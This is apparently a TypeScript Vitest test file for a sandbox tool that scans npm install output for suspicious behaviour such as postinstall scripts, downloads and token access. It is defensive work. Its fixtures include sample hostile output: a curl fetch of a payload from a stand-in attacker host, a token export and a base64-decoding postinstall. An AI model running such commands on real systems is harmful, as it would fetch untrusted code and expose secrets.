import { describe, it, expect } from 'vitest'
import { fromExecution } from '../evidence'
import type { ExecutionEvidenceInput } from '../types'

function makeInput(overrides?: Partial<ExecutionEvidenceInput>): ExecutionEvidenceInput {
  return {
    sandboxId: 'sandbox-test-001',
    packageName: 'test-pkg',
    exitCode: 0,
    stdout: '',
    stderr: '',
    durationMs: 5000,
    packageManager: 'npm',
    packagesRequested: ['test-pkg'],
    ...overrides,
  }
}

describe('fromExecution', () => {
  it('marks network and filesystem signals as unavailable', () => {
    const report = fromExecution(makeInput())
    expect(report.availableSignals.network_request).toBe('unavailable')
    expect(report.availableSignals.filesystem_mutation).toBe('unavailable')
  })

  it('marks process, lifecycle, download, and env signals as inferred', () => {
    const report = fromExecution(makeInput())
    expect(report.availableSignals.process_execution).toBe('inferred')
    expect(report.availableSignals.lifecycle_script).toBe('inferred')
    expect(report.availableSignals.binary_download).toBe('inferred')
    expect(report.availableSignals.environment_access).toBe('inferred')
  })

  it('always includes a process_execution event', () => {
    const report = fromExecution(makeInput())
    const processes = report.events.filter((e) => e.type === 'process_execution')
    expect(processes.length).toBeGreaterThanOrEqual(1)
    expect(processes[0].source).toBe('inferred')
  })

  it('sets exit code severity to warning on non-zero exit', () => {
    const report = fromExecution(makeInput({ exitCode: 1 }))
    const processes = report.events.filter((e) => e.type === 'process_execution')
    expect(processes[0].severity).toBe('warning')
  })

  it('detects postinstall from output', () => {
    const report = fromExecution(
      makeInput({ stdout: 'Running postinstall script' }),
    )
    const lifecycleScripts = report.events.filter(
      (e) => e.type === 'lifecycle_script',
    )
    expect(lifecycleScripts.length).toBeGreaterThanOrEqual(1)
    if (lifecycleScripts[0].type === 'lifecycle_script') {
      expect(lifecycleScripts[0].scriptType).toBe('postinstall')
    }
  })

  it('detects curl/wget from output', () => {
    const report = fromExecution(
      makeInput({ stdout: 'curl https://evil.example.com/payload' }),
    )
    const downloads = report.events.filter(
      (e) => e.type === 'binary_download',
    )
    expect(downloads.length).toBeGreaterThanOrEqual(1)
  })

  it('detects suspicious env/token pattern from output', () => {
    const report = fromExecution(
      makeInput({ stdout: 'export NPM_TOKEN=abc123' }),
    )
    const envAccesses = report.events.filter(
      (e) => e.type === 'environment_access',
    )
    expect(envAccesses.length).toBeGreaterThanOrEqual(1)
    if (envAccesses[0].type === 'environment_access') {
      expect(envAccesses[0].key).toBe('TOKEN')
    }
  })

  it('produces empty lifecycle/download/env for clean install output', () => {
    const report = fromExecution(
      makeInput({
        stdout: 'added 1 package in 0.5s\nup to date. nothing changed.',
      }),
    )
    const lifecycleScripts = report.events.filter(
      (e) => e.type === 'lifecycle_script',
    )
    const downloads = report.events.filter(
      (e) => e.type === 'binary_download',
    )
    const envAccesses = report.events.filter(
      (e) => e.type === 'environment_access',
    )
    expect(lifecycleScripts).toHaveLength(0)
    expect(downloads).toHaveLength(0)
    expect(envAccesses).toHaveLength(0)
  })

  it('reports buildSummary with available signals', () => {
    const report = fromExecution(makeInput())
    expect(report.summary).toBeDefined()
    expect(report.summary.totalEvents).toBe(report.events.length)
  })

  it('sets source detail on all inferred events', () => {
    const report = fromExecution(
      makeInput({ stdout: 'postinstall base64 -d' }),
    )
    for (const event of report.events) {
      expect(event.source).toBe('inferred')
      expect(event.sourceDetail).toBeTruthy()
    }
  })
})
